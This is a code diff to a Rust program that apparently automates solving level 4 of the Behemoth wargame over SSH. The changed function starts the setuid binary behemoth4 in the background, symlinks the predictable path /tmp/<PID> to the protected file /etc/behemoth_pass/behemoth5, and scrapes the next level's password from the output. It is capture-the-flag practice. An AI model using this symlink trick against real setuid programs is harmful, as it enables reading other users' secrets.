@@ -285,23 +285,26 @@ fn behemoth4(password: &str) -> Result<String> {
 
     read_until(&mut channel, "behemoth4@gibson:~$ ")?;
 
-    println!("starting process in parallel and then pausing");
-    write_line(&mut channel, "/behemoth/behemoth4&")?;
-    write_line(&mut channel, "PID=$!")?;
-    write_line(&mut channel, "kill -STOP $PID")?;
+    println!("creating a tmp folder and moving to it");
+    write_line(&mut channel, "cd $(mktemp -d)")?;
+    read_until(&mut channel, "$ ")?;
 
-    println!("creating symlink and then restarting");
-    write_line(&mut channel, "ln -s /etc/behemoth_pass/behemoth5 /tmp/$PID")?;
-    write_line(&mut channel, "kill -CONT $PID")?;
-    
-    read_until(&mut channel, "behemoth4@gibson:~$ ")?;
-    read_until(&mut channel, "behemoth4@gibson:~$ ")?;
-    read_until(&mut channel, "behemoth4@gibson:~$ ")?;
-    read_until(&mut channel, "behemoth4@gibson:~$ ")?;
-    let result = read_until(&mut channel, "behemoth4@gibson:~$ ")?;
-    // let result: Vec<&str> = result.split("\n").collect();
-    // let result = result[result.len()-2].trim();
+    println!("starting process in background");
+    write_line(&mut channel, "bash -c 'echo $$ > test.pid && sleep 3 && exec /behemoth/behemoth4' &")?;
+    read_until(&mut channel, "$ ")?;
+
+    println!("creating symlink");
+    write_line(&mut channel, "ln -s /etc/behemoth_pass/behemoth5 /tmp/$(cat test.pid)")?;
+    read_until(&mut channel, "$ ")?;
+
+    println!("waiting for result");
+    std::thread::sleep(std::time::Duration::from_secs(5));
+
+    write_line(&mut channel, "")?;
+    let result = read_until(&mut channel, "$ ")?;
+    println!("{:?}", result);
+    let result = result.split("\n").map(|s| s.trim()).find(|s| s.len() == 10).unwrap();
     println!("retrieved behemoth5 pass '{result}'\n");
 
-    Ok("result".to_string())
+    Ok(result.to_string())
 }
